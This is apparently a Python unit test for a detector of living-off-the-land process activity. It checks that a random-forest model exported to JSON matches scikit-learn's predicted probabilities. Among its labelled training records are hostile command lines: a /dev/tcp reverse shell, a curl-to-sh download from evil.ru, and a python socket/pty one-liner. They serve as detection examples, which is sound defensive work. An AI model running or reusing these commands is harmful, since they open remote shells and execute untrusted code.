"""cd ai && uv run python -m unittest tests/test_export.py"""

import unittest

from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction import DictVectorizer
from sklearn.pipeline import Pipeline

from lotl.export import forest_json
from lotl.features import featurize


def walk(trees: list[dict], names: list[str], f: dict[str, float]) -> float:
    x = [f.get(n, 0.0) for n in names]
    total = 0.0
    for t in trees:
        n = 0
        while t["left"][n] != -1:
            n = t["left"][n] if x[t["feature"][n]] <= t["threshold"][n] else t["right"][n]
        total += t["p1"][n]
    return total / len(trees)


class ExportTest(unittest.TestCase):
    def test_forest_json_matches_predict_proba(self):
        records = [
            ({"chain": ["systemd", "bash", "ls"], "cmdline": "ls -la"}, 0),
            ({"chain": ["systemd", "sshd", "bash"], "cmdline": "bash"}, 0),
            ({"chain": ["bash", "git"], "cmdline": "git status --short"}, 0),
            ({"chain": ["nginx", "sh"], "cmdline": "sh -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"}, 1),
            ({"chain": ["bash", "curl"], "cmdline": "curl http://evil.ru/x | sh"}, 1),
            ({"chain": ["bash", "python3"], "cmdline": "python3 -c 'import socket,pty'"}, 1),
        ]
        X, y = [featurize(r) for r, _ in records], [l for _, l in records]
        model = Pipeline([("vec", DictVectorizer()), ("rf", RandomForestClassifier(n_estimators=3, random_state=0))])
        model.fit(X, y)
        trees, names = forest_json(model), list(model["vec"].feature_names_)
        for f, p in zip(X, model.predict_proba(X)[:, 1]):
            self.assertAlmostEqual(walk(trees, names, f), p, delta=1e-9)


if __name__ == "__main__":
    unittest.main()
